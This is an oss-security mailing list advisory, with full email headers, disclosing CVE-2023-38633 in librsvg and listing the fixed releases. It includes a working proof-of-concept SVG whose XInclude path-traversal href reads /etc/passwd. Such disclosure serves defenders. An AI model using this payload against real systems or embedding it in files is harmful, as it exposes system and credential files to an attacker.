Received: (qmail 23689 invoked by uid 550); 27 Jul 2023 20:36:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 23665 invoked from network); 27 Jul 2023 20:36:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=message-id : date :
 subject : to : from : content-type : content-transfer-encoding :
 mime-version; s=corp-2023-03-30;
 bh=GnU5D9vvWIch01iQEy40UCfEtd5Fx4V25yQ+0QgbjRY=;
 b=kJhD6HL9P4zGlH9Amq9eRuIgI/W6It5CCuxJCw4u9ojSQV2rvkfGcIkIIaWIBPwWsMMl
 Ll5mNDTr/5FEi2yDKO28B+r/gYv2/ZSlcCbQauxgre0utrU4SLgxQTFRsE6wP8fulSI1
 2KyyRSNljY+Smbf/GFQ2kMgzHWX0sSkFA2ZZb0C/E7iMVu9/nMANT2u1JNbASKH3PSL1
 WZj3na3znhw2+eZuEgl1ejTWo1OQJGl56o80eeFJbJTQgD8KwAEqxuG2hfb2ikYecVL8
 fD4l//aOf94Ae9JyiSNnv9WNVJgTnx/ygcHcE83oorOP5qxaNHQb1rTONxzCj7TvrN0X ew== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=PT47iHYPxfP2t+TbiwmxP3U0Ohlc12JyluOMo0uu34gOUlm9WsM3GRnFIsQfQtcnBkVMvbEDEypVNUF5vlRWbEG2rQoOt9ZfrV2qwzT5XN01Tb+oiZWQZzba0RV+Y5v692f1N9EY3Asb2NrCzccdqAuwlpPT0tpWKuRgz1DALs9+ohKrBNMVDw4l1Bn9SJE53zGEseRa3GEsB1cIfPmNeMAxfQgcPqmp8qKq35/2apEnwmHrevAeabi6eRTZjwrb0JoXkErjtISzIqB9GK7HFXk/PvGqiKKdWbvXmLezXaArig6ybeyHiFDSrCALv+f33BvXAYcc2hrzsVYtuG//XQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=GnU5D9vvWIch01iQEy40UCfEtd5Fx4V25yQ+0QgbjRY=;
 b=g67odwZO2LgXSJK4qGpyh9WA9vqiGG/7QUBwF1iOoyxG8MwScVfnFtAqL1TT9FgiJaZVo08XQtW+lYjjhPluU96j2+MFuCBAYeMxxWI4E9vwDYdoAmqian5HaRBaFCqR2KkkN0nrFs5JXHq7ro1KhlXyfP1y89rRvXBkD6IIrLeAvVVBaEz0/t+6+T9W82CT84ZW5Y81bef4akHFHCVJw/m/rEw+sJeGg+RF1p9QFlmLB6kD6iEVVs8uvmz/NxECn1cnWFQ2D3t8oPIvNfArdsW+yWcLpSTB7++AtewphwMzTLw37i6v+NFLlkgsKXLx0AHdycmB9qVAx6o1qwirTA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=GnU5D9vvWIch01iQEy40UCfEtd5Fx4V25yQ+0QgbjRY=;
 b=B5956nahPPmpBKbTSVBxiWL8tw6O+Bv5dBJz6eipR1zFOj8ML8IiCaC/LHidVleUiftBhZIMLc7TPQhCAOrL4q+DvfpYWJe+rRCx/2EIdaJE8OJcfcGMd2DjQ0F+Go11/iQ6wdjYJzG0CFV9lmylcGJiBwgHzan/71SL5XgyNjA=
Message-ID: <73b96607-5080-939c-d354-33da849d195d@oracle.com>
Date: Thu, 27 Jul 2023 13:36:17 -0700
User-Agent: Mozilla Thunderbird
Content-Language: en-US
To: oss-security@lists.openwall.com
From: Alan Coopersmith <alan.coopersmith@oracle.com>
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
 q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
 RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
 /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
 PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
 vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
 GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
 ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
 ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
 AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
 DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
 bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
 yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
 Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
 XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
 R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
 EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
 LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
 AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
 uoPzepWFbgvLuHIMvyjRog==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: SA1P222CA0099.NAMP222.PROD.OUTLOOK.COM
 (2603:10b6:806:35e::13) To IA0PR10MB7303.namprd10.prod.outlook.com
 (2603:10b6:208:40d::5)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: IA0PR10MB7303:EE_|BLAPR10MB4916:EE_
X-MS-Office365-Filtering-Correlation-Id: b6e14810-0958-4d16-7078-08db8ee1235a
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	qIEBP2a3Nlkiqnau1px4Zq6f0vjhYRx0yqY8PuyRTDqJ/PET0V0nzJdRZyh4haAnuLtx/Z9RgUKddtQIohskTTNDshtbBRHjJM/C33iw7XP5aapBFzs56kJWA5/TCDQHlS5+bMlCkFyWr9KEaNj+KlJi7WGxB+0lSTWPUAvBJYp1Zjvq52V9tBy7V9o2+Vua4HEr1u2sUsWGRsFnqwd3jL3vm0AB3a03XMxPytGWInyPjJMxqOmd+c+lleIqv0aOlvO7E50Gn3urBRKLcQ7ELR95XAGhO5XUFMrJNSrEmL925njDlxXYKo+fw+qJxIHSzgMqozOMecKXGHZ6eDWDAPHIAvOL4HqgbBpRGXaK7tq/4w6tVHy7lFNPeSWATjuafSLNE5gFyAvUIp678WIpaPX5No+iyXxLCVNL7IMlWHOI54BgNsxaq3e17oJxdEDTaqZ8YBjiwM1mtpuPVZEquBbIpny7tqjriiIZCn/qe4/PSTAWr3boQuIUeJI2BqTfwCXJieJkKnurPMDT2EMZWgIqrCLMDsinBb+57qPwiBF0RDf7m4uKNjMHceYUf7kGQUDe36wn1hYmksquWRm2QUCzkrDlZgD2AXgN9E3Nsn7OIH+l5GoyTgCJE+exD9/eDq5eNRXbqMRhDDkN8a76gCDyph+6ca8wjX+eVmQwdu0=
X-Forefront-Antispam-Report: 
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:IA0PR10MB7303.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230028)(346002)(366004)(376002)(136003)(39860400002)(396003)(451199021)(31686004)(8676002)(5660300002)(83380400001)(2616005)(186003)(6506007)(44832011)(26005)(86362001)(8936002)(31696002)(6666004)(6916009)(316002)(6486002)(41300700001)(66556008)(66476007)(66946007)(966005)(6512007)(478600001)(38100700002)(2906002)(36756003)(45980500001)(43740500002);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: 
	=?utf-8?B?aGcwUjhvQWZhTy9MVDdoNWVwMUkrOWNLUUI2aWNTa0kyalhDclRJWm1mRFZR?=
 =?utf-8?B?d2RIVlRxblliUnJyMDV6bHhzdVBScDAvb2lLaVcrZjlZOUIzTGJLYk5uWUpV?=
 =?utf-8?B?eXYxNEY5MnpudTVwOEZ4dWlmT3JVQk1KM2gxbTdtR3VpblhqSXhmOVI5TC9X?=
 =?utf-8?B?VXpFMnQxalZOOFByVHlUQnMrNWNrMkU1aFFxR3k3ZFRpc3dRcjJoQlpYb3hT?=
 =?utf-8?B?ZFdjMmtCOUN4cDlQOGg4NU8yVXZPV3dPa1pQYzZ0dVpHNjg0UkJ0citDOWFi?=
 =?utf-8?B?YVRhNEx3NFpTcXVBdStxSzl6dDJKMHZxaWNjV2VxaWdJWWhGZFkyVlhZY3FD?=
 =?utf-8?B?K0tJWURFZWo0c0s0Y3R4aGlUR1d1Z1FxdEcxN1ZOTkw1Rk42LzQ2clJOZDNC?=
 =?utf-8?B?TnluQUxkQzVwL08rS082cERIVTNIUm9NY0RsTWg3QVBtaS9acnRYZHdQcEs0?=
 =?utf-8?B?ZmlqSjBzbWZER3FNWkU2QmFqRUkzS0FpcDNKWlRabmFsQ2VzUjgwYkhvM1hT?=
 =?utf-8?B?VCtSWnZpQmJUNlhIalF3U0NqYUlNNFFlMmVsYnRrRFdmajhadnB0b0x5SVF0?=
 =?utf-8?B?VStXTjRZTm9lcmFxUkp4WnFtOW43UXpmTDB3NDlGT0JWVzdDYXNabmJ5VCtJ?=
 =?utf-8?B?SVE0RTR3Nmg1UHpJdk5SVDBVQXlEZG9LMlYzdU5rQXJ3bFl4SFgzSGlVV3Rx?=
 =?utf-8?B?UzEvbXp6eXFudlJZUUtQV3FrSm8yeTVrZUZ6MGMwZTZFN1lJUXBJOE5aSUto?=
 =?utf-8?B?bElzSktXc21WbDRuUGVBTGUyc2RCQU9kdTZPTDRZVnkrdmIxTkhHWURnS1h0?=
 =?utf-8?B?WTRFSjBuNjVlazNERG4vaUZ0WTQ0dnJHMnlIVll2enBtdHRlTXpJby9MczJ1?=
 =?utf-8?B?enZNOXlMeFlVMFd6VlYxcWkvOHg3eEw1eVQxNGNTSjRNYlhmL2lUM045TXRw?=
 =?utf-8?B?bE13QWYxNHFPdjNZZjRwbUd1QzBzc1c4SVhOaVAzamowL0I5TDkwNEhCOHlV?=
 =?utf-8?B?VmQzSU9Ob1FPS3VkOVpxTU41QmpDSzVRc1UyRW9mMVhTWUtHdFR2Y0ZLZGhT?=
 =?utf-8?B?VXJ4WHh0VlJJMUdqcmYwNWt5ODliK0hjMjVHdllybFZ4UG9XU0RTMjlMQkdV?=
 =?utf-8?B?T2d4d3ZUNFZXSkU0N2svbWxVam1VanBtV2d5N3pDMVZ1N1hJVk5Yb1c0UUxN?=
 =?utf-8?B?SXZVb3BZeHdCWDF1dk5uM2ZhZW1zalFXdGxjditJRlRDUTlpZ3pMWTMySk0v?=
 =?utf-8?B?Rmp3VFlOcElxTlQ3bTVmWHJxamVyWk14bGNFV2tqUjhvUDQrY1greXFQTU9h?=
 =?utf-8?B?TXlNUGtUNWsxMTNzTjJyNUFzaTBLbVNITHAxWGRSOUMxUlA2QlVmT014emdT?=
 =?utf-8?B?WVZMV2Ezc0JDMHpTZFFSekNFc1ROa2tva095ZVpqOFgyZjJ2U0t2Q0liRWJM?=
 =?utf-8?B?WElRaEVGVXlzcDg1UERMZm4xYVNaOURIMkRoZjdDemw4bS92dDgvQWlSS0lY?=
 =?utf-8?B?L1I1OTFDeUhkczg0OXhBNWlyTVlidVJPUHBXdmhPY3h6R2JyN3E5M3E5RHRN?=
 =?utf-8?B?TWZuRXpiUmo5N2t3NXVzTGtqZTBTQ1ZVTllQekRjVmdmWlZVbUhmRXFJanFF?=
 =?utf-8?B?MVYwdmpsRDBkaFU2b2o0SXRXdmZyRkU4OTZyYURYdEl0VlJmQXgyMjNxdFdu?=
 =?utf-8?B?YVRsamFDQ1hsaUZDRGdyVTJvWkR0azJ5b0pVRVUyVVRkVTJtc0Q2Mm9wQ2hQ?=
 =?utf-8?B?NXBQSUtXZUVnMHBFQXdEQ011YU9MdW1yclE2eDJySnZ1akxvWHBzSG9WdEFI?=
 =?utf-8?B?ckZ6Skl1cElPdGJ0TjZ2RzVDYUlWMEZ4S2tmd1ZXRUVyV2JaSzdRSWFmUE93?=
 =?utf-8?B?d0ZlZG5LaFlTWURaTVRiblNJV0x1ZlFpR3htazVLbmFLSzhJaEFFdjE1RXk4?=
 =?utf-8?B?K2Y4TWN1ZEFhaGFoTDhvNlRwM2w4K2p6Ymh6RzJkckMvYmM0RGNjd3BEVFFQ?=
 =?utf-8?B?KzBwM1VTVUtsYWZUWE9FZTNXNHA5SXhnK0pESlFoQ2lJaUQxNVkxcmtWNXM2?=
 =?utf-8?B?M1N4K2dHL202aDJrM2xodGFXSW45UUJMN1loOTNlS2lFZmVwbTZaVWR6UnpR?=
 =?utf-8?B?SlNhbkpEWjFJV211SE5JWUx1c0tkTFdwbW9zTkMzZzFaaWhrRlBnUlgrV1Rr?=
 =?utf-8?B?R3c9PQ==?=
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0: 
	IC+c4O5STf/OQYIuduVP3sbZAaayakD/+7PsEXM4DiNTjK1n0HgfbFjFe9ptgqAybo48w2WJMZ+VOfq7FhRVEnYCxTS9BGOK1TQ7qJZaRXuOUrroccpftgLbWprNInIcqebxNXO84vGpQWtJfBUx9T5dwWeW8pgbwwnJ1dIJpEx7PQ2/Fq3BYJ+VtY8jqsOE6U9bvOKfdEB2/1Y4iKRdpXvI/4B0i5Oe+gj8ZxUE8zxz3Ididc9aR1Eg+vu8K0AwZkJyBLQ0JUZXndLMMSr6kE7bQtqkBJzVaENi/MhSRMwK8PkJsLZ+4/fJ2//A0hYja0JXZLM0DtZlclZk4BON+skufOrvtOnKTYmeL+MVxOlRtEjkmvvpOBsrUtwkNBZzeVwxAtw98zQ0tvQCuVyH1e+sLduUeXd9DE7kRD89uKMTKFvcaTzAdxAmUMpfXXkc3+5ID4IhN36sSv7S5zV7doa+SPyErZSqI7/XW/pgFmZM7rqjUD0lWjKO0MWxlGq+oRng8UGHcBCxgmhSD4mBL1hBlLsniTDfK9iqZQBHC+vqiwIFI0eKdS8NKFgLyTtQxOKV9JVl2qlRobHld13CtUQhycWPr5u32Rjec2kN9Ie/nYtvGmqLVmuSEpOiOi244Jj4yPSHoIpqTwOp/+7qjoscq/CLqCO6kUpBYSJw2VebsFxQzMBiRWsiEvo3mAiZupW/IYPhpNHbbwARcCvAEt7rsbxCrUKPkWved5KvzxvYymRodfSjdgxPamccEbuXpfHYlXiUyrAJzsV01pJjbQ==
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: b6e14810-0958-4d16-7078-08db8ee1235a
X-MS-Exchange-CrossTenant-AuthSource: IA0PR10MB7303.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 27 Jul 2023 20:36:21.7142
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: DKEeehqoVnx0aWAXS8cScEyQYfHV2JCv6JrUNPRKtQMhsz8Bx2DhOUptyuHuQDfJ5b58FL6VS6FUlWTrdseUnKztZACVMGaKsNRjcrTbSqY=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: BLAPR10MB4916
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.254,Aquarius:18.0.957,Hydra:6.0.591,FMLib:17.11.176.26
 definitions=2023-07-27_10,2023-07-26_01,2023-05-22_02
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 adultscore=0 phishscore=0 bulkscore=0
 malwarescore=0 mlxscore=0 spamscore=0 mlxlogscore=948 suspectscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2306200000
 definitions=main-2307270187
X-Proofpoint-GUID: wSeoLzgVMc1IrmyqN7-Zu2T7vkGq8RiX
X-Proofpoint-ORIG-GUID: wSeoLzgVMc1IrmyqN7-Zu2T7vkGq8RiX
Subject: [oss-security] CVE-2023-38633 in librsvg: Arbitrary file read when xinclude href has
 special characters

I haven't seen this go by yet, so for those who haven't seen it:

https://gitlab.gnome.org/GNOME/librsvg/-/issues/996 reports:

CVE-2023-38633: Arbitrary file read when xinclude href has special characters

This was reported by Zac Sims.

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
   <rect width="300" height="300" style="fill:rgb(255,255,255);" />
   <text x="10" y="100">
     <xi:include href=".?../../../../../../../../../../etc/passwd" parse="text" 
encoding="UTF-8">
       <xi:fallback>file not found</xi:fallback>
     </xi:include>
   </text>
</svg>

This ends up actually including the contents of /etc/passwd, bypassing the 
checks in UrlResolver::resolve_href().

The above linked bug report provides further analysis and links to merge 
requests for the fixes.   Fixes have been published in new releases of
librsvg for many release trains:

     2.56.3
     2.55.3
     2.54.6
     2.52.10
     2.50.8
     2.48.11
     2.46.6

-- 
         -Alan Coopersmith-                 alan.coopersmith@oracle.com
          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
